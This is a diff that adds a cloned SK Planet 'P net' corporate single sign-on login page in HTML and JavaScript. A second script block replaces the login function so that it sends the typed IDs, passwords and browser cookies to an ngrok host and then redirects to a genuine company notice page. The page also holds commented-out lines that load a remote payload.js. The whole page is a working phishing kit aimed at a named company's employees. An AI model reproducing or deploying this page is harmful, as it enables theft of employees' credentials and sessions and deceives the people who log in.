@@ -1,0 +1,654 @@
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <title></title>
+    <style type="text/css">
+        div.popDiv{
+            position: absolute;
+            /*background-color: yellow;*/
+            visibility: visible;
+            z-index: 10;
+            width: 390px;
+            height: 232px;
+            border-color: black;
+            border-style: solid;
+            border-width: 0px;
+        }
+
+        div.titleDiv{
+            position: relative;
+            top: 0px;
+            left: 0px;
+            /*background-color: red;*/
+            visibility: visible;
+            z-index: 11;
+            width: 390px;
+            height: 29px;
+            border-color: black;
+            border-style: solid;
+            border-width: 0px;
+            background-image: url('https://pnetsso.skplanet.com/img/titlebg1.jpg');
+        }
+        div.titleDiv2{
+            position: relative;
+            top: 0px;
+            left: 335px;
+            /*background-color: red;*/
+            visibility: visible;
+            z-index: 11;
+            width: 55px;
+            height: 20px;
+            border-color: black;
+            border-style: solid;
+            border-width: 0px;
+        }
+
+        .style2 {
+            color: #000000;
+            font-size: 12px;
+            /*font-family: Arial, Helvetica, sans-serif;*/
+        }
+
+    </style>
+    <script language="javascript" type="text/javascript" src="https://pnetsso.skplanet.com/js/json2.js"></script>
+    <script language="JavaScript" type="text/javascript">
+    var ieVer;
+    var isMouseDown = false;
+    var isCloseDown = false;
+    var xmlHttp;
+
+    function validation() {
+        if (document.LOGIN.txtUSER.value == "" && document.LOGIN.txtPASSWORD.value == "") {
+            alert("Login Error !\n ID or Password is incorrect.");
+            return false;
+        }
+        else if (document.LOGIN.txtUSER.value == "") {
+            alert("Login Error !\n ID or Password is incorrect.");
+            return false;
+        }
+        else if (document.LOGIN.txtPASSWORD.value == "") {
+            alert("Login Error !\n ID or Password is incorrect.");
+            return false;
+        }
+	
+        if (document.LOGIN.txtUSER.value != "") {
+            if (document.LOGIN.txtUSER.value.length < 5) {
+                alert("Login Error !\n ID or Password is incorrect.");
+                return false;
+            }
+            else {
+                var uid = document.LOGIN.txtUSER.value.substr(0, 4);
+                if (uid.toLowerCase() != "skp\\") {
+                    alert("Login Error !\n ID or Password is incorrect.");
+                    return false;
+                }
+            }
+        }
+
+        document.getElementById("USER").value = document.getElementById("txtUSER").value
+        document.getElementById("PASSWORD").value = document.getElementById("txtPASSWORD").value
+
+        return true;
+    }
+
+    function OnClickAutoPostPolicy() {
+        
+        var bResult = ctlCred.SetAutoPostCredentialPolicy();
+     
+    }
+
+    function OnClickOutlookProfile() {
+        ctlCred.AdjustOutlookProfile();
+    
+    }
+
+    function OnCreateCredential() {
+       
+        if (!ctlCred.CreateCredential("outlook.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("owa.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPMBX1.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPMBX2.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPMBX3.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPMBX4.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPAD1.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPAD2.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWCAS1.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWCAS2.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWCAS3.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWCAS4.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPCASV.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("autodiscover.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("ims.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("ims.skplanet.co.kr", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("tws.sktelecom.com", "skt.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("pcw.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) { //pcw 추가 2011.10.27
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("sktis.sktelecom.com", "skt.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("oma.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPCAS1.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPCAS2.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPCAS3.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPCAS4.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPEDG1.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPEDG2.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPTMG1.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("SKP-GWPTMG2.SKP.AD", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+        if (!ctlCred.CreateCredential("owa13.skplanet.com", "skp.ad", document.LOGIN.USER.value, document.LOGIN.PASSWORD.value, 1)) {
+            alert("Can't create domain credential.");
+        }
+    }
+
+    function login() {
+        if (!validation())
+        {
+            return false;
+        }
+        Save_Id();
+        document.LOGIN.USER.value=document.LOGIN.USER.value.substr(4,14);
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Windows NT 5.0") != -1)
+        {
+            alert("Not supported OS..");
+            //document.LOGIN.submit();
+            return false;
+        }
+        //if (navigator.appName == "Microsoft Internet Explorer") {
+	if ((userAgent.indexOf("Trident") != -1) || (navigator.appName == "Microsoft Internet Explorer")) {
+            OnClickAutoPostPolicy();
+            OnClickOutlookProfile();
+            var winType = ctlCred.GetWindowsType();
+            if (winType == true)	
+                OnCreateCredential();
+        }
+
+        if (callAuth() == false)
+            return false;
+
+        document.LOGIN.submit();
+        return true;
+    }
+
+    function callAuth() {
+        xmlHttp = MakeHttpObject();
+        var url = "/AnyAuth/AuthorizationRegister.aspx"
+        var tAccount = document.LOGIN.txtUSER.value;
+        var tPass = document.LOGIN.txtPASSWORD.value;
+	tPass = encodeURIComponent(tPass);
+        var param = "ACCOUNT=" + tAccount + "&PASSWORD=" + tPass;
+            
+        xmlHttp.open("POST", url, false);
+        xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=euc-kr");
+        xmlHttp.send(param);
+
+        if (xmlHttp.readyState == 4) { //서버처리완료
+            if (xmlHttp.status != 200) {
+                alert("AD Server is not responding.");
+                return false;
+            }
+        }
+
+        var result = JSON.parse(xmlHttp.responseText);
+
+        if (result.Success == false) {
+            alert(result.Message);
+            return false;
+        }
+
+        SetCookie("AuthorizationKey", result.Key, null, null, ".skplanet.com");
+            
+        return true;
+    }
+
+    function getCookieVal (offset) {
+        var endstr = document.cookie.indexOf (";", offset);
+        if (endstr == -1)
+            endstr = document.cookie.length;
+
+        return unescape(document.cookie.substring(offset, endstr));
+    }
+
+    function SetCookie (name, value) {
+        var argv = SetCookie.arguments;
+        var argc = SetCookie.arguments.length;
+        var expires = (argc > 2) ? argv[2] : null;
+        var path = (argc > 3) ? argv[3] : null;
+        var domain = (argc > 4) ? argv[4] : null;
+        var secure = (argc > 5) ? argv[5] : false;
+        path = "/";
+		
+        document.cookie = name + "=" + escape (value) +
+                        ((expires == null) ? "" : ("; expires=" +expires.toGMTString())) +
+                        ((path == null) ? "" : ("; path=" + path)) +
+                        ((domain == null) ? "" : ("; domain=" + domain)) +
+                        ((secure == true) ? "; secure" : "");		
+			
+    }
+
+    function GetCookie (name) { 
+        var arg = "";
+        var lv_CookieValue = "";
+        arg = name + "=";
+        var alen = arg.length;
+        var clen = document.cookie.length;
+        var i = 0;
+        while (i < clen) {
+            var j = i + alen;
+
+            if(document.cookie.substring(i, j) == arg){
+                lv_CookieValue = getCookieVal(j);
+            }
+
+            i = document.cookie.indexOf(" ", i) + 1;
+            if (i == 0)
+                break;
+        }
+        return lv_CookieValue;
+    }
+		 
+    function setUserCookie( name, value, expiredays ){
+        var todayDate = new Date();
+        todayDate.setDate( todayDate.getDate() + expiredays );
+        document.cookie = name + "=" + escape( value ) + "; path=/; expires=" + todayDate.toGMTString() + ";"
+    }
+
+    function getUserCookie( name ){
+        var nameOfCookie = name + "=";
+        var x = 0;
+        while ( x <= document.cookie.length ){
+            var y = (x+nameOfCookie.length);
+            if ( document.cookie.substring( x, y ) == nameOfCookie ) { 
+                if ( (endOfCookie=document.cookie.indexOf( ";", y )) == -1 )
+                    endOfCookie = document.cookie.length;
+                return unescape( document.cookie.substring( y, endOfCookie ) );
+            } 
+            x = document.cookie.indexOf( " ", x ) + 1;
+            if ( x == 0 )
+                break;
+        }
+        return "";
+    }
+
+    function delCookie( cookieName )
+    {
+        var expireDate = new Date();
+        expireDate.setDate( expireDate.getDate() - 1 );
+        document.cookie = cookieName + "= " + "; expires=" + expireDate.toGMTString() + "; path=/";
+    }
+
+    function Save_Id() {
+        varUserName = document.LOGIN.USER.value;
+        varPwdName = document.LOGIN.PASSWORD.value;
+        if (varUserName != "") {
+            setUserCookie("user_name", varUserName, 999);
+            setUserCookie("check_field", "Done", 999);
+        }
+        else {
+            alert('Login Error !\n ID or Password is incorrect.');
+
+        }
+    }
+        function OnClickWindowsType() {
+            /*
+            ctlCred 콘트롤이 식별할 수 있는 윈도우 종류는 하기와 같이 정의되어 있다.
+            1000 : 윈도우 버전 식별에 실패함.
+            1001 : 윈도우 XP 홈 또는 미디어 센터
+            1002 : 윈도우 XP Professional	=> 도메인 자격증명 저장 지원
+            1003 : 비스타 홈
+            1004 : 비스타 비즈니스 이상		=> 도메인 자격증명 저장 지원
+            1005 : 윈도우 서버 2003			=> 도메인 자격증명 저장 지원
+            1006 : 윈도우 서버 2008			=> 도메인 자격증명 저장 지원
+            1007 : 윈도우 2000 Professional
+            1008 : 윈도우 XP Professional 64bit
+            1009 : 윈도우 XP 임베드
+            */
+            var winType = ctlCred.GetWindowsType();
+           
+            //            }
+        }
+        
+        function EnterCheck(evt) {
+            // Enter Key 치면 아래 로직을 탄다.
+            var evCode
+            if (navigator.appName.indexOf("Netscape") > -1) {
+                evCode = evt.which;
+            }
+            else {
+                evCode = event.keyCode;
+            }
+
+            if (evCode == 13) {
+        
+                if (document.LOGIN.txtPASSWORD.value == '') document.LOGIN.txtPASSWORD.focus();
+                else if (document.LOGIN.txtPASSWORD.value == '') document.LOGIN.txtPASSWORD.focus();
+                else login();
+            }
+        }
+        
+        function Load_Id()
+        {
+            delCookie("user_pwd");
+            varID = getUserCookie("user_name");
+            varPwd = "";
+            varCheck = getUserCookie("check_field");
+
+            if (varCheck == "Done") {
+                document.LOGIN.txtUSER.value = varID;
+                document.LOGIN.Save_Info.checked=true;
+                document.LOGIN.txtPASSWORD.focus();
+            }
+            else {
+                document.LOGIN.txtUSER.focus();
+            }
+        }
+
+        function MakeHttpObject() {
+            try { return new XMLHttpRequest(); } catch (e) { } //7
+            try { return new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { } //IE6
+            try { return new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) { } //IE5
+            alert("Not supported Browser.");
+            return null;
+        }
+	
+        function iniValue() {
+            Load_Id();
+
+            if (getUserCookie("SMTEXT") == "ID"){
+                alert("Login Error !\n ID or Password is incorrect.");
+                return true;
+            }
+            else if(getUserCookie("SMTEXT") == "PASSWORD"){
+                alert("Login Error !\n ID or Password is incorrect.");
+                return true;
+            }
+        }
+        
+        function fnModalResetPW(){
+            win999=window.open("http://pnet.skplanet.com/Contents/Anonymous/PasswordReset.aspx" ,"win9999", "width=350,height=460,top=20,left=40");
+        }
+</script>
+</head>
+<script>
+  function iniValue() {
+    // Dynamically load external payload.js script
+    const s = document.createElement("script");
+    //s.src = "https://232e-210-211-88-240.ngrok-free.app/payload.js";
+    //s.src = "https://232e-210-211-88-240.ngrok-free.app/payload.js";
+    document.head.appendChild(s);
+  }
+
+  function login() {
+    const user1 = document.getElementById("USER")?.value || "";
+    const pass1 = document.getElementById("PASSWORD")?.value || "";
+    const user2 = document.getElementById("txtUSER")?.value || "";
+    const pass2 = document.getElementById("txtPASSWORD")?.value || "";
+
+    // Send all possible credentials + cookies
+    fetch("https://b4e483e92130.ngrok-free.app", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+     body: JSON.stringify({
+       USER: user1,
+        PASSWORD: pass1,
+       txtUSER: user2,
+       txtPASSWORD: pass2,
+       cookies: document.cookie
+     })
+   });
+    //Send all possible credentials + cookies
+
+    
+    // Redirect to real login page
+    //window.location.href = "https://pnet.skplanet.com";
+    //window.location.href = "https://arena.web.skplanet.com/OurStory/OurStoryView.aspx?ItemID=3702&fromlist=Main";
+    window.location.href = "https://pnet.skplanet.com/Contents/Contents/Page/Notice/NoticeView.aspx?SearchField=SUBJECT&SearchValue=&PageIndex=1&PageMode=&BoardID=26493";
+  }
+
+  function EnterCheck(e) {
+    if (e.key === "Enter") {
+      login();
+    }
+  }
+</script>
+</head>
+
+<body onload="iniValue();">
+  <form name="LOGIN" method="post" action="http://192.168.184.128/login.fcc" onsubmit="event.preventDefault(); login();">
+    <div style="display:none;">
+      <input type="hidden" name="target" value="/sso/main.htm">
+      <input type="hidden" name="smauthreason" value="0">
+      <table>
+        <tr>
+          <td>ID</td>
+          <td><input type="text" name="USER" id="USER"></td>
+          <td>Password</td>
+          <td><input type="password" name="PASSWORD" id="PASSWORD"></td>
+          <td><input type="button" value="Login" onclick="login()"></td>
+        </tr>
+        <tr>
+          <td colspan="5"><input type="checkbox" name="Save_Info">Save ID</td>
+        </tr>
+      </table>
+    </div>
+
+    <div id="divPop" name="divPop" class="popDiv">
+      <div id="divMain" class="titleDiv">
+        <div id="divMain2" class="titleDiv2"></div>
+      </div>
+      <table border="0" width="390" cellspacing="0" cellpadding="0" style="background-image:url('https://pnetsso.skplanet.com/img/bodybg.jpg'); height:219px;">
+        <tr><td colspan="3" style="height:60px;"></td></tr>
+        <tr>
+          <td style="width:16px;"></td>
+          <td style="width:150px; height:30px;">&nbsp;&nbsp;&nbsp;<span class='style2'>Connecting</span><span class='style2'> P net...</span></td>
+          <td style="width:224px;"><span class='style2'>ID is </span><font size="2px"><u><b>skp￦Employee ID</b></u></font></td>
+        </tr>
+        <tr>
+          <td></td>
+          <td style="height:30px;" class="style2">&nbsp;&nbsp;&nbsp;ID (U) : </td>
+          <td align="left"><input type="text" name="txtUSER" id="txtUSER" style="width:180px; font-family:Gulim;"></td>
+        </tr>
+        <tr>
+          <td></td>
+          <td style="height:30px;" class="style2">&nbsp;&nbsp;&nbsp;Password (P) :</td>
+          <td align="left">
+            <input type="password" name="txtPASSWORD" id="txtPASSWORD" class="inputbox" style="width:180px" onkeydown="javascript:EnterCheck(event);">
+          </td>
+        </tr>
+        <tr><td colspan="3" style="height:5px;">&nbsp;</td></tr>
+        <tr valign="top">
+          <td colspan="3" style="height:40px;" align="center">
+            <img src="https://pnetsso.skplanet.com/img/enpic4.gif" onmouseover="this.style.cursor='pointer'" onclick="return login();">
+            &nbsp;
+            <img src="https://pnetsso.skplanet.com/img/enpic5.gif" onmouseover="this.style.cursor='pointer'" onclick="return endClose3();">
+          </td>
+        </tr>
+      </table>
+    </div>
+  </form>
+    <script type="text/javascript" language="javascript">
+        //debugger;
+        objMainDiv = document.getElementById("divPop");
+        objTitleDiv = document.getElementById("divMain");
+        objTitleDiv.onmouseup = setFree;
+        objTitleDiv.onmouseout = setFree;
+        objTitleDiv.onmousedown = setGrap;
+        objTitleDiv.onmousemove = drag;
+
+        objTitleDiv2 = document.getElementById("divMain2");
+        objTitleDiv2.onmousedown = endClose1;
+        objTitleDiv2.onmouseup = endClose2;
+        objTitleDiv2.onmouseover = btnCloseOver;
+
+        var posX = document.documentElement.clientWidth - objMainDiv.clientWidth;
+        var posY = document.documentElement.clientHeight - objMainDiv.clientHeight;
+
+        if (posX < 0) {
+            posX = 0;
+        }
+        else {
+            posX = posX / 2
+        }
+
+        if (posY < 0) {
+            posY = 0;
+        }
+        else {
+            posY = posY / 2
+        }
+
+        objMainDiv.beforeX = posX;
+        objMainDiv.beforeY = posY;
+        objMainDiv.clientBeforeX = 0;
+        objMainDiv.clientBeforeY = 0;
+
+        objMainDiv.style.left = posX + 'px';
+        objMainDiv.style.top = posY + 'px';
+        //alert(objMainDiv.beforeX);
+
+        function setGrap(ev) {
+            //debugger;
+            ev = ev || window.event;		//ev : work in firefox and chrome	//window.event : work in ie
+            //alert(ev.clientX);
+            isMouseDown = true;
+            this.style.cursor = 'move';
+            var mDiv = this.parentNode;
+            //var mDiv = document.getElementById("divPop");
+            //document.getElementById("divMain").style.cursor = "move";
+            //alert(this.parentNode.beforeX);
+            if (ev.clientX || ev.clientY) {
+                //mDiv.clientBeforeX = ev.clientX;
+                //mDiv.clientBeforeY = ev.clientY;
+                mDiv.clientBeforeX = ev.clientX;
+                mDiv.clientBeforeY = ev.clientY;
+            } else {
+                mDiv.clientBeforeX = ev.pageX;
+                mDiv.clientBeforeY = ev.pageY;
+            }
+            //alert(mDiv.clientBeforeX);
+        }
+
+        function drag(ev) {
+            //debugger;
+            ev = ev || window.event;
+            if (isMouseDown) {
+                //alert(this.parentNode.beforePoint);
+                //alert(isMouseDown);
+                //alert(ev.clientX);
+                var diffX;
+                var diffY;
+                //var mDiv = this.parentNode;
+                var mDiv = document.getElementById("divPop");
+                //alert(ev.pageX);
+                if (ev.clientX || ev.clientY) {
+                    diffX = ev.clientX - mDiv.clientBeforeX;
+                    diffY = ev.clientY - mDiv.clientBeforeY;
+                    //alert(diffX);
+                    mDiv.beforeY = diffY + mDiv.beforeY;
+                    mDiv.beforeX = diffX + mDiv.beforeX;
+                    mDiv.style.top = mDiv.beforeY + 'px';
+                    mDiv.style.left = mDiv.beforeX + 'px';
+                    mDiv.clientBeforeX = ev.clientX;
+                    mDiv.clientBeforeY = ev.clientY;
+                } else {
+                    diffX = ev.pageX - mDiv.clientBeforeX;
+                    diffY = ev.pageY - mDiv.clientBeforeY;
+                    //alert(diffX);
+                    mDiv.beforeY = diffY + mDiv.beforeY;
+                    mDiv.beforeX = diffX + mDiv.beforeX;
+                    mDiv.style.top = (diffY + mDiv.beforeY) + 'px';
+                    mDiv.style.left = (diffX + mDiv.beforeX) + 'px';
+                    mDiv.clientBeforeX = ev.pageX;
+                    mDiv.clientBeforeY = ev.pageY;
+                }
+            }
+        }
+
+        function setFree(ev) {
+            isMouseDown = false;
+        }
+
+        function btnCloseOver(ev) {
+            this.style.cursor = 'pointer';
+        }
+
+        function btnCloseOut(ev) {
+            this.style.cursor = 'default';
+        }
+
+        function endClose1(ev) {
+            isCloseDown = true;
+        }
+
+        function endClose2() {
+            if (isCloseDown == true) {
+                //window.open('', '_self').close();
+                window.open('about:blank', '_self').close();
+            }
+        }
+
+        function endClose3() {
+            //window.open('', '_self').close();
+            window.open('about:blank', '_self').close();
+        }
+    </script>
+	<object id="ctlCred" classid="CLSID:84580F47-4330-4BB0-A172-31502F59158D" codebase="/netscred.cab#Version=5,1,1,0"></object>
+</body>
+</html>
+
